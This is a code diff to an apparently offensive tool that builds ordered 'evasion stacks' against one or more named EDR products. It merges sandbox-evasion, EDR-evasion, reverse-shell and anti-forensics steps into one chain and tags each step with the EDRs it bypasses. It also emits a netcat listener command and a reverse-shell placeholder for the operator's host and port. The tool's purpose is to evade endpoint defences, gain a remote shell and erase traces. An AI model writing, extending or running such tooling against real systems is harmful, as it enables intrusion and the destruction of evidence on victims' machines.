@@ -31,11 +31,12 @@ class StackEntry:
     rationale: str
     techniques: list[str] = field(default_factory=list)
     risk: str = "HIGH"
+    counters: list[str] = field(default_factory=list)  # which EDRs this step counters
 
 
 @dataclass
 class EvasionStackResult:
-    edr: str
+    edr: str              # comma-separated when multi-EDR
     listener: str         # operator's listener setup hint
     chain: list[StackEntry]
     total_steps: int
@@ -124,8 +125,19 @@ _PROFILES: dict[str, list[tuple[str, str]]] = {
 }
 
 
+# Section ordering for the merged multi-EDR stack: sandbox first, then evasion,
+# then shell, then anti-forensics. Within each section we preserve the order in
+# which techniques first appeared across the merged profiles.
+_SECTION_ORDER = {
+    "sandbox_evasion": 0,
+    "evasion": 1,
+    "shell": 2,
+    "anti_forensics": 3,
+}
+
+
 def build_stack(
-    edr: str,
+    edrs: list[str] | str,
     lhost: str,
     lport: int,
     language: str = "powershell",
@@ -135,80 +147,138 @@ def build_stack(
     shell_command: str | None = None,
 ) -> EvasionStackResult:
     """
-    Build an ordered evasion stack for the given EDR.
+    Build an ordered evasion stack tuned for one or more EDRs.
+
+    Accepts either a single EDR string (legacy single-EDR call) or a list of EDRs
+    (multi-EDR call). When multiple EDRs are supplied:
+      - the union of their profile techniques is taken,
+      - duplicates are removed (first appearance wins for ordering within section),
+      - each entry's `counters` field lists which EDRs that step is bypassing,
+      - sections (sandbox → evasion → shell → anti-forensics) are concatenated.
 
     `shell_command` is the payload command produced by the shell generator —
     routers/stack.py builds the shell separately and passes it in so we don't
     have a circular dependency.
     """
-    if edr not in _PROFILES:
-        raise ValueError(f"Unknown EDR '{edr}'. Supported: {', '.join(SUPPORTED_EDRS)}")
+    # Normalize input to a list.
+    if isinstance(edrs, str):
+        edrs_list = [edrs]
+    else:
+        edrs_list = list(edrs)
+    if not edrs_list:
+        raise ValueError("At least one EDR is required.")
 
-    profile = _PROFILES[edr]
-    entries: list[StackEntry] = []
+    for e in edrs_list:
+        if e not in _PROFILES:
+            raise ValueError(f"Unknown EDR '{e}'. Supported: {', '.join(SUPPORTED_EDRS)}")
 
     # Lookup tables — late-imported to avoid circular imports.
     from .anti_forensics import SUPPORTED_TECHNIQUES as AF_TECHS, generate_anti_forensics
     from .sandbox_evasion import SUPPORTED_TECHNIQUES as SE_TECHS, generate_sandbox_evasion
     from .evasion import SUPPORTED_TECHNIQUES as EV_TECHS
 
-    for technique, rationale in profile:
-        if technique == "shell":
+    # Build a per-technique merged record: technique → {first_rationale, counters, section}
+    merged: dict[str, dict] = {}
+    insertion_order: list[str] = []
+
+    for edr in edrs_list:
+        for technique, rationale in _PROFILES[edr]:
+            if technique in merged:
+                merged[technique]["counters"].append(edr)
+                continue
+            merged[technique] = {
+                "rationale": rationale,
+                "counters": [edr],
+                "section": _section_for(technique, AF_TECHS, SE_TECHS, EV_TECHS),
+            }
+            insertion_order.append(technique)
+
+    # Stable sort by section, preserving first-seen order within section.
+    # Snapshot original index — `.index()` during in-place sort would be wrong.
+    original_index = {t: i for i, t in enumerate(insertion_order)}
+    insertion_order.sort(key=lambda t: (_SECTION_ORDER.get(merged[t]["section"], 99),
+                                         original_index[t]))
+
+    entries: list[StackEntry] = []
+    for technique in insertion_order:
+        section = merged[technique]["section"]
+        rationale = merged[technique]["rationale"]
+        counters = merged[technique]["counters"]
+
+        if section == "shell":
             cmd = shell_command or (
                 f"# operator: insert {language} reverse shell to {lhost}:{lport} here"
             )
             entries.append(StackEntry(
                 step=len(entries) + 1, module="shell", technique=language,
                 command=cmd, rationale=rationale,
-                techniques=["T1059"], risk="HIGH",
+                techniques=["T1059"], risk="HIGH", counters=counters,
             ))
             continue
 
-        if technique in AF_TECHS:
+        if section == "anti_forensics":
             if not include_anti_forensics:
                 continue
             r = generate_anti_forensics(technique, obfuscate=obfuscate)
             entries.append(StackEntry(
                 step=len(entries) + 1, module="anti_forensics",
                 technique=technique, command=r.command, rationale=rationale,
-                techniques=r.techniques, risk=r.risk,
+                techniques=r.techniques, risk=r.risk, counters=counters,
             ))
             continue
 
-        if technique in SE_TECHS:
+        if section == "sandbox_evasion":
             if not include_sandbox_evasion:
                 continue
             r = generate_sandbox_evasion(technique, obfuscate=obfuscate)
             entries.append(StackEntry(
                 step=len(entries) + 1, module="sandbox_evasion",
                 technique=technique, command=r.command, rationale=rationale,
-                techniques=r.techniques, risk=r.risk,
+                techniques=r.techniques, risk=r.risk, counters=counters,
             ))
             continue
 
-        if technique in EV_TECHS:
+        if section == "evasion":
             r = generate_evasion(technique, obfuscate=obfuscate, lhost=lhost, lport=lport)
             entries.append(StackEntry(
                 step=len(entries) + 1, module="evasion",
                 technique=technique, command=r.command, rationale=rationale,
-                techniques=r.techniques, risk=r.risk,
+                techniques=r.techniques, risk=r.risk, counters=counters,
             ))
             continue
 
-        # Profile referenced an unknown technique — surface as a hard error so
-        # we don't silently ship a stack with gaps.
-        raise ValueError(f"Profile '{edr}' references unknown technique '{technique}'")
+        raise ValueError(f"Profile references unknown technique '{technique}'")
 
+    edr_label = ",".join(edrs_list)
     listener = f"rlwrap nc -lvnp {lport}    # connect-back from {lhost}"
-    summary = (
-        f"{edr} evasion stack with {len(entries)} steps. "
-        f"Payload: {language} reverse shell to {lhost}:{lport}."
-    )
+    if len(edrs_list) == 1:
+        summary = (
+            f"{edr_label} evasion stack with {len(entries)} steps. "
+            f"Payload: {language} reverse shell to {lhost}:{lport}."
+        )
+    else:
+        summary = (
+            f"Multi-EDR stack ({len(edrs_list)} EDRs) with {len(entries)} steps. "
+            f"Counters: {', '.join(edrs_list)}. "
+            f"Payload: {language} reverse shell to {lhost}:{lport}."
+        )
 
     return EvasionStackResult(
-        edr=edr,
+        edr=edr_label,
         listener=listener,
         chain=entries,
         total_steps=len(entries),
         summary=summary,
     )
+
+
+def _section_for(technique: str, af, se, ev) -> str:
+    if technique == "shell":
+        return "shell"
+    if technique in af:
+        return "anti_forensics"
+    if technique in se:
+        return "sandbox_evasion"
+    if technique in ev:
+        return "evasion"
+    raise ValueError(f"Unknown technique '{technique}'")
